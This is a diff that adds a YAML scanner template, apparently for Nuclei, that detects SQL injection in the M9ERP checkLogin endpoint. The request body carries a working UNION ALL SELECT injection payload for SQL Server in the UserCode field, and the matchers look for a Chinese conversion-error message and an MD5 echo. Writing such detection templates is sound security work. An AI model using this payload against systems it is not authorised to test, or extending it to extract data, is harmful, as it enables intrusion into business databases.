@@ -1,0 +1,43 @@
+id: poc-yaml-m9erp-checklogin-sqli
+info:
+  name: M9ERP checkLogin SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    M9ERP checkLogin endpoint is vulnerable to SQL injection, allowing malicious users to execute arbitrary queries.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/UserWH/checkLogin"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "UserCode": "123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- ugAI",
+        "UserPsw": "123"
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+        part: body
+      - type: regex
+        regex:
+          - "0x{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
